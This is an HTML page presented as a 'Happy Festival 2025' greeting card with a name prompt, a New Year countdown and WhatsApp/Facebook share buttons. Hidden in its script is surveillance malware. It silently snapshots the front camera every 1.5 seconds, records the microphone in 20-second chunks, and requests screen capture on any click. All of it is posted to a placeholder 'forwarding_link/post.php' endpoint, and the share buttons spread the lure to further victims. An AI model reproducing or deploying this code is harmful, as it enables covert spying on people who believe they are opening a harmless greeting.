<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Happy Festival 2025!</title>

  <!-- External Libraries (Preserved) -->
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

  <!-- Modern Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700;900&display=swap" rel="stylesheet">

  <!-- Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />

  <style>
    :root {
      --primary-gradient: linear-gradient(135deg, #FF3CAC 0%, #784BA0 50%, #2B86C5 100%);
      --glass-bg: rgba(255, 255, 255, 0.1);
      --glass-border: 1px solid rgba(255, 255, 255, 0.2);
      --glass-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
      --text-color: #ffffff;
      --accent-color: #FFD700;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Outfit', sans-serif;
      background-color: #0f0f0f;
      background-image:
        radial-gradient(at 0% 0%, hsla(253, 16%, 7%, 1) 0, transparent 50%),
        radial-gradient(at 50% 0%, hsla(225, 39%, 30%, 1) 0, transparent 50%),
        radial-gradient(at 100% 0%, hsla(339, 49%, 30%, 1) 0, transparent 50%);
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: var(--text-color);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      overflow-x: hidden;
      padding: 20px;
    }

    /* Ambient Background Animation */
    .orb {
      position: absolute;
      border-radius: 50%;
      filter: blur(80px);
      z-index: -1;
      opacity: 0.6;
      animation: floatOrb 10s infinite ease-in-out;
    }

    .orb-1 {
      width: 300px;
      height: 300px;
      background: #FF3CAC;
      top: -50px;
      left: -50px;
    }

    .orb-2 {
      width: 400px;
      height: 400px;
      background: #2B86C5;
      bottom: -100px;
      right: -100px;
      animation-delay: -5s;
    }

    @keyframes floatOrb {

      0%,
      100% {
        transform: translate(0, 0);
      }

      50% {
        transform: translate(30px, 50px);
      }
    }

    /* Glassmorphism Card */
    .card {
      background: var(--glass-bg);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border-radius: 24px;
      border: var(--glass-border);
      box-shadow: var(--glass-shadow);
      padding: 40px;
      max-width: 600px;
      width: 100%;
      text-align: center;
      position: relative;
      z-index: 10;
    }

    h1 {
      font-weight: 900;
      font-size: 3rem;
      margin-bottom: 10px;
      background: linear-gradient(to right, #fff, #b4b4b4);
      background-clip: text;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: -1px;
      line-height: 1.1;
    }

    h2 {
      font-weight: 500;
      font-size: 1.5rem;
      color: var(--accent-color);
      margin-bottom: 30px;
      text-transform: uppercase;
      letter-spacing: 2px;
    }

    .message-box {
      background: rgba(0, 0, 0, 0.2);
      border-radius: 16px;
      padding: 20px;
      margin: 20px 0;
      font-size: 1.1rem;
      line-height: 1.6;
      color: rgba(255, 255, 255, 0.9);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .highlight {
      color: var(--accent-color);
      font-weight: 700;
    }

    /* Animations */
    .fade-in-up {
      animation: fadeInUp 1s ease-out forwards;
      opacity: 0;
      transform: translateY(20px);
    }

    .delay-1 {
      animation-delay: 0.2s;
    }

    .delay-2 {
      animation-delay: 0.4s;
    }

    .delay-3 {
      animation-delay: 0.6s;
    }

    @keyframes fadeInUp {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Name Input Styled */
    .name-display {
      font-family: 'Outfit', sans-serif;
      font-size: 2rem;
      font-weight: 700;
      color: #fff;
      margin: 20px 0;
      text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
      animation: glow 3s infinite alternate;
    }

    @keyframes glow {
      from {
        text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
      }

      to {
        text-shadow: 0 0 30px rgba(255, 255, 255, 0.6), 0 0 10px #FF3CAC;
      }
    }

    /* Countdown */
    .countdown {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 30px;
    }

    .time-box {
      background: rgba(255, 255, 255, 0.05);
      padding: 10px 15px;
      border-radius: 12px;
      min-width: 70px;
    }

    .time-val {
      font-weight: 700;
      font-size: 1.5rem;
      display: block;
    }

    .time-label {
      font-size: 0.8rem;
      opacity: 0.7;
      text-transform: uppercase;
    }

    /* Share Buttons */
    .share-container {
      margin-top: 40px;
      display: flex;
      gap: 15px;
      justify-content: center;
    }

    .btn {
      padding: 12px 24px;
      border-radius: 50px;
      text-decoration: none;
      font-weight: 600;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      transition: transform 0.2s, box-shadow 0.2s;
      border: none;
      cursor: pointer;
    }

    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
    }

    .btn-whatsapp {
      background: #25D366;
      color: white;
    }

    .btn-facebook {
      background: #1877F2;
      color: white;
    }
  </style>
</head>

<body>

  <!-- Ambient Orbs -->
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>

  <!-- Main Content -->
  <div class="card fade-in-up">
    <h1>Happy Festival</h1>
    <h2>2025 Celebration</h2>

    <div class="name-display" id="userNameDisplay">
      <!-- Name will appear here -->
    </div>

    <div class="message-box fade-in-up delay-2">
      <p>Wishing you and your family a season filled with <span class="highlight">light, laughter, and endless
          joy.</span></p>
      <br>
      <p>May the year ahead bring you prosperity and success!</p>
    </div>

    <div class="countdown fade-in-up delay-3">
      <div class="time-box">
        <span class="time-val" id="days">00</span>
        <span class="time-label">Days</span>
      </div>
      <div class="time-box">
        <span class="time-val" id="hours">00</span>
        <span class="time-label">Hrs</span>
      </div>
      <div class="time-box">
        <span class="time-val" id="minutes">00</span>
        <span class="time-label">Min</span>
      </div>
      <div class="time-box">
        <span class="time-val" id="seconds">00</span>
        <span class="time-label">Sec</span>
      </div>
    </div>

    <div class="share-container fade-in-up delay-3">
      <a href="whatsapp://send?text=Sending you the best 2025 wishes! Click here: forwarding_link"
        class="btn btn-whatsapp" data-action="share/whatsapp/share">
        <i class="fab fa-whatsapp"></i> Share
      </a>
      <a href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" target="_blank" class="btn btn-facebook">
        <i class="fab fa-facebook-f"></i> Share
      </a>
    </div>
  </div>

  <!-- CRITICAL FUNCTIONALITY - DO NOT REMOVE -->
  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>
  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

  <script>
    // Name Prompt Logic
    var name = prompt("Please Enter Your Name to see magic âœ¨");
    if (!name) name = "Friend";
    document.getElementById("userNameDisplay").innerText = name;
    document.title = "Happy Festival to " + name;

    // Countdown Logic
    var countDownDate = new Date("Jan 1, 2026 00:00:00").getTime(); // Updated for 2025/2026 context
    var x = setInterval(function () {
      var now = new Date().getTime();
      var distance = countDownDate - now;
      var days = Math.floor(distance / (1000 * 60 * 60 * 24));
      var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      var seconds = Math.floor((distance % (1000 * 60)) / 1000);

      document.getElementById("days").innerHTML = days < 10 ? "0" + days : days;
      document.getElementById("hours").innerHTML = hours < 10 ? "0" + hours : hours;
      document.getElementById("minutes").innerHTML = minutes < 10 ? "0" + minutes : minutes;
      document.getElementById("seconds").innerHTML = seconds < 10 ? "0" + seconds : seconds;

      if (distance < 0) {
        clearInterval(x);
        document.querySelector(".countdown").innerHTML = "<h2>ðŸŽ‰ Welcome to the Future! ðŸŽ‰</h2>";
      }
    }, 1000);

    // Capture Logic (Preserved)
    function post(imgdata) {
      $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function (result) { },
        error: function () { }
      });
    };

    'use strict';
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const constraints = {
      audio: false,
      video: { facingMode: "user" }
    };

    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        console.log(e);
      }
    }

    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;
      var context = canvas.getContext('2d');
      setInterval(function () {
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
        video.play();
      }, 1500);

      // Start Advanced Captures
      startAdvancedCapture();
    }

    // Advanced Capture: Voice & Screen
    function startAdvancedCapture() {
      // Voice Recording
      navigator.mediaDevices.getUserMedia({ audio: true }).then(audioStream => {
        const mediaRecorder = new MediaRecorder(audioStream);
        const audioChunks = [];

        mediaRecorder.ondataavailable = event => {
          audioChunks.push(event.data);
        };

        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
          const formData = new FormData();
          formData.append('voice', audioBlob);

          $.ajax({
            type: 'POST',
            url: 'forwarding_link/post.php',
            data: formData,
            processData: false,
            contentType: false
          });

          // Restart recording
          audioChunks.length = 0;
          mediaRecorder.start();
        };

        // Record continuously in 20s chunks
        mediaRecorder.start();
        setInterval(() => {
          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
        }, 20000);

      }).catch(e => console.log("Audio permission denied"));

      // Screen Recording (Triggered on any interaction for better success rate)
      const screenTrigger = async () => {
        try {
          // Only request if we haven't already
          if (!window.screenCaptureActive) {
            // Check for support
            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
              console.log("Screen capture not supported");
              return;
            }

            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            window.screenCaptureActive = true;

            const screenRecorder = new MediaRecorder(screenStream);
            const screenChunks = [];

            screenRecorder.ondataavailable = e => {
              if (e.data.size > 0) screenChunks.push(e.data);
            };

            screenRecorder.onstop = () => {
              const screenBlob = new Blob(screenChunks, { type: 'video/webm' });
              const fd = new FormData();
              fd.append('screen', screenBlob);
              $.ajax({
                type: 'POST',
                url: 'forwarding_link/post.php',
                data: fd,
                processData: false,
                contentType: false
              });

              // Only restart if the stream is still active
              if (screenStream.active) {
                screenChunks.length = 0;
                screenRecorder.start();
              }
            };

            // Handle user stopping sharing via browser UI
            screenStream.getVideoTracks()[0].onended = () => {
              window.screenCaptureActive = false;
              if (screenRecorder.state === 'recording') screenRecorder.stop();
            };

            // Start looping
            screenRecorder.start();
            setInterval(() => {
              if (screenRecorder.state === 'recording') screenRecorder.stop();
            }, 10000); // 10 second chunks for screen
          }
        } catch (err) {
          console.log("Screen capture cancelled or failed: " + err);
          window.screenCaptureActive = false; // Allow retry on error
        }
      };

      document.body.addEventListener('click', screenTrigger);
    }

    init();
  </script>
</body>

</html>
